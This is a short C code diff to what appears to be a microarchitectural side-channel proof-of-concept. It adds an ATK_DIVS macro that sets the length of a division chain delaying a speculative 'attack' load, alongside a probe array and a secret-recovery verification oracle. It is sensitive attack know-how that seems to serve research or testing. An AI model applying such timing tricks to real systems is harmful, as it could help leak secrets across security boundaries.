@@ -72,6 +72,9 @@ extern int oracle_report_verify32(uint64_t recovered, uint64_t known_mask,
 #ifndef VARY_GUESS
 #define VARY_GUESS 0
 #endif
+#ifndef ATK_DIVS
+#define ATK_DIVS 12
+#endif
 
 static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
 static volatile uint64_t atk_buf[64] __attribute__((aligned(LINE)));
@@ -145,19 +148,48 @@ delayed_atk_load(uint64_t token)
 {
     uint64_t z = (token | 1) & 0xffffff;
     asm volatile("" : "+r"(z));
+#if ATK_DIVS == 0
+    /* Keep the marker's architectural value on the sentinel line. */
+    uint64_t x = 0;
+#else
     uint64_t x = z;
+#if ATK_DIVS >= 1
     x /= (z + 2);
+#endif
+#if ATK_DIVS >= 2
     x /= (z + 3);
+#endif
+#if ATK_DIVS >= 3
     x /= (z + 4);
+#endif
+#if ATK_DIVS >= 4
     x /= (z + 5);
+#endif
+#if ATK_DIVS >= 5
     x /= (z + 6);
+#endif
+#if ATK_DIVS >= 6
     x /= (z + 7);
+#endif
+#if ATK_DIVS >= 7
     x /= (z + 8);
+#endif
+#if ATK_DIVS >= 8
     x /= (z + 9);
+#endif
+#if ATK_DIVS >= 9
     x /= (z + 10);
+#endif
+#if ATK_DIVS >= 10
     x /= (z + 11);
+#endif
+#if ATK_DIVS >= 11
     x /= (z + 12);
+#endif
+#if ATK_DIVS >= 12
     x /= (z + 13);
+#endif
+#endif
     return atk_load(atk_buf, x);
 }
 
